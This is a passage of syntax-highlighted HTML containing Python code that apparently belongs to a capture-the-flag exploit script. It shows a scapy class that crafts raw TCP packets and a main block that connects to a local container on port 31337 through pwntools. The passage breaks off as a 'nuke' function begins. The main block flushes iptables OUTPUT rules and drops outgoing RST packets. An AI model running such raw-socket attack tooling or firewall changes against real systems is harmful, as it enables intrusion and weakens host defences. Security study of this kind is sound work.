class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">last_sent </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_fin</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"SND: FIN"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"F"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_rst</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"SND: RST"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"R"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_finack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"SND: FIN+ACK"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"FA"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ack </span><span class="token operator">=</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)">#raise Exception("FIN+ACK")</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">abort </span><span class="token operator">=</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_ack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"A"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">last_ack </span><span class="token operator">=</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ack</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to_acknowledge </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">payload</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)">#logger.debug("SND: ACK with ack # %d" % (pkt[TCP].seq + len(pkt[TCP].load)))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> to_acknowledge </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ack </span><span class="token operator">=</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> to_acknowledge</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">recv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> timeout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        elapsed </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">timeout </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">elapsed </span><span class="token operator">&lt;</span><span class="token plain"> timeout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Q</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                retval </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Q</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">pop</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> retval</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">0.01</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            elapsed </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">0.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)">#returning nothing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">clear_recv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Q </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">wait_all_acks</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> timeout</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        elapsed </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        delta </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0.1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">timeout </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">elapsed </span><span class="token operator">&lt;</span><span class="token plain"> timeout</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">last_ack </span><span class="token operator">==</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_queue</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            time</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">delta</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            elapsed </span><span class="token operator">+=</span><span class="token plain"> delta</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> __name__</span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">'__main__'</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    sport </span><span class="token operator">=</span><span class="token plain"> random</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">randint</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">40000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">60000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"iptables -F OUTPUT"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    os</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"iptables -A OUTPUT -p tcp --sport %d --tcp-flags RST RST -j DROP"</span><span class="token operator">%</span><span class="token plain">sport</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    conf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">verb </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    tcp_hs </span><span class="token operator">=</span><span class="token plain"> TcpHandshake</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"172.17.0.2"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">31337</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> sport</span><span class="token operator">=</span><span class="token plain">sport</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    r </span><span class="token operator">=</span><span class="token plain"> tubes</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sock</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send </span><span class="token operator">=</span><span class="token plain"> tcp_hs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_data</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">recv </span><span class="token operator">=</span><span class="token plain"> tcp_hs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">recv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    tcp_hs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">start</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    tosend </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">b""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">nuke</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">offset</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">global</span><span class="token plain"> tosend</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># scapy send is slow. to speed it up,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># chunk the commands</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">tosend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">400</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            r</span><span class="token punctuation" 